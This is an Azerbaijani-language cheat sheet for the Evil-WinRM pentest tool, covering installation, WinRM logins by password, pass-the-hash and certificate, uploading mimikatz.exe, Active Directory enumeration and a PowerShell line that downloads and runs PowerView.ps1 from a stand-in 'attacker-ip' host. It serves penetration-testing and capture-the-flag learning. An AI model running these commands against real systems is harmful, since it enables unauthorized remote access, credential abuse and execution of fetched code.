# 🕵️ Evil-WinRM İstifadə Sənədi

## 📌 Nədir?
**Evil-WinRM** Windows sistemlərinə **WinRM (Windows Remote Management)** protokolu üzərindən qoşulmaq üçün hazırlanmış bir **pentest alətidir**.  
Adətən **Cobalt Strike**, **Empire** kimi post-exploitation mərhələlərində istifadə olunur.  

Əsas məqsədi:
- Windows sistemlərə şəbəkə üzərindən qoşulmaq,
- Komandaları interaktiv PowerShell sessiyasında icra etmək,
- Faylları yükləmək və ya çıxarmaq,
- Post-exploitation işlərini rahatlaşdırmaqdır.

---

## ⚙️ Quraşdırma
**Debian/Kali Linux** sistemlərində:
```bash
sudo apt install evil-winrm -y
```

**Ruby ilə əl ilə:**
```bash
gem install evil-winrm
```

---
Bu xidmətin default portları:

TCP 5985 → HTTP üzərindən WinRM (ən çox istifadə edilən)

TCP 5986 → HTTPS üzərindən WinRM

---

## 🚀 Əsas İstifadə
```bash
evil-winrm -i <IP> -u <istifadəçi_adı> -p <parol>
```

### Nümunə:
```bash
evil-winrm -i 10.10.10.123 -u administrator -p 'Parol123!'
```

Bu halda:
- `-i` → qoşulacağın serverin IP ünvanı  
- `-u` → istifadəçi adı  
- `-p` → parol  

---

## 🔑 Sertifikat və Hash ilə qoşulma

### Hash ilə (Pass-the-Hash):
```bash
evil-winrm -i 10.10.10.123 -u administrator -H aad3b435b51404eeaad3b435b51404ee:3c7c5b5c1ad5d77cfec34567f9ab3456
```

### Sertifikat ilə:
```bash
evil-winrm -i 10.10.10.123 -c ./user.crt -k ./user.key -u administrator
```

---

## 📂 Fayl Əməliyyatları

**Fayl yükləmək (upload):**
```powershell
upload ./mimikatz.exe C:\Windows\Temp\mimikatz.exe
```

**Fayl endirmək (download):**
```powershell
download C:\Users\Administrator\Desktop\flag.txt ./flag.txt
```

---

## 📜 Script və fayl icrası

**Web-dən script yükləmək və icra etmək:**
```powershell
iex (New-Object Net.WebClient).DownloadString('http://attacker-ip/PowerView.ps1')
```

**Lokaldan script icra etmək:**
```powershell
. ./PowerView.ps1
```

---

## 🔍 Faydalı Komandalar

**Domain məlumatı almaq:**
```powershell
whoami /all
```

**AD qrupları görmək:**
```powershell
net group "Domain Admins" /domain
```

**Sessiyada PowerShell icrası:**
```powershell
powershell -c "Get-Process"
```

**Fayl oxumaq:**
```powershell
type C:\Users\Administrator\Desktop\secret.txt
```

---

## 🛠️ Əlavə Parametrlər
- **`-S`** → SSL bağlantısı (HTTPS üzərindən)  
- **`-ssl`** → SSL üçün alternativ flag  
- **`-r`** → Script yükləmək üçün qovluq göstərmək  

---

## ✅ Nəticə
Evil-WinRM ilə:
- Windows serverə rahat qoşulmaq,
- İstənilən PowerShell komandalarını icra etmək,
- Faylları ötürmək və qəbul etmək,
- Post-exploitation mərhələlərini asanlaşdırmaq mümkündür.
